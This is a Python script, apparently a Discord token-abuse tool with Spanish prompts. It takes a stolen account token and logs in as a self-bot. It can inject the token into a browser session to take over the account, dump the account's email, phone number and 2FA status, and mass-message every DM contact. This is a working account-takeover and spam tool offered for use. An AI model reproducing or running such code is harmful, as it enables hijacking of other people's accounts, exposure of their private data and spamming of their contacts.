import threading, requests, discord, random, time, os
from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle
init(convert=True)

guildsIds = []
friendsIds = []
channelIds = []
clear = lambda: os.system('cls')
clear()

class Login(discord.Client):
    async def on_connect(self):
        for g in self.guilds:
            guildsIds.append(g.id)
 
        for f in self.user.friends:
            friendsIds.append(f.id)

        for c in self.private_channels:
            channelIds.append(c.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except Exception as e:
            print(f"[{Fore.RED}-{Fore.RESET}] Invalid token", e)
            input("Press any key to exit..."); exit(0)

def tokenLogin(token):
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """
    driver.get("https://discord.com/login")
    driver.execute_script(script + f'\nlogin("{token}")')

def tokenInfo(token):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            mfa = r.json()['mfa_enabled']
            print(f'''
            [{Fore.RED}User ID{Fore.RESET}]         {userID}
            [{Fore.RED}User Name{Fore.RESET}]       {userName}
            [{Fore.RED}2FA{Fore.RESET}]        {mfa}
            [{Fore.RED}Email{Fore.RESET}]           {email}
            [{Fore.RED}Phone number{Fore.RESET}]    {phone if phone else ""}
            [{Fore.RED}Token{Fore.RESET}]           {token}
            ''')
            input()

def tokenFuck(token):
    headers = {'Autorizacion': token}
    sendall = input('Quieres mandar mensaje a todas las personas recientes? > ')
    print(f"[{Fore.RED}+{Fore.RESET}] Bombardeando token")

    if sendall == 'y':
        try:
            sendmessage = input('Cual sera el mensaje enviado? > ')
            for id in channelIds:
                requests.post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers, data={"content": f"{sendmessage}"})
                print(f'Mandando mensajes a {id}')
        except Exception as e:
            print(f'Error ignorado {e}')
def getBanner():
    banner = f'''

                        By 0505#1574
                <{Fore.RED}1{Fore.RESET}> Dm Recent Users
                <{Fore.RED}2{Fore.RESET}> Token Info
    '''.replace('░', f'{Fore.RED}░{Fore.RESET}')
    return banner
def startMenu():
    print(getBanner())
    print(f'[{Fore.RED}-{Fore.RESET}] Enter Option', end=''); choice = str(input('  :  '))

    if choice == '1':
        print(f'[{Fore.RED}>{Fore.RESET}] Token', end=''); token = input('  :  ')
        print(f'[{Fore.RED}>{Fore.RESET}] Threads (number)', end=''); threads = input('  :  ')
        Login().run(token)
        if threading.active_count() < int(threads):
            t = threading.Thread(target=tokenFuck, args=(token, ))
            t.start()

    elif choice == '2':
        print(f'[{Fore.RED}>{Fore.RESET}] Token', end=''); token = input('  :  ')
        tokenInfo(token)

    elif choice.isdigit() == False:
        clear()
        startMenu()

    else:
        clear()
        startMenu()
        
if __name__ == '__main__':
    startMenu()
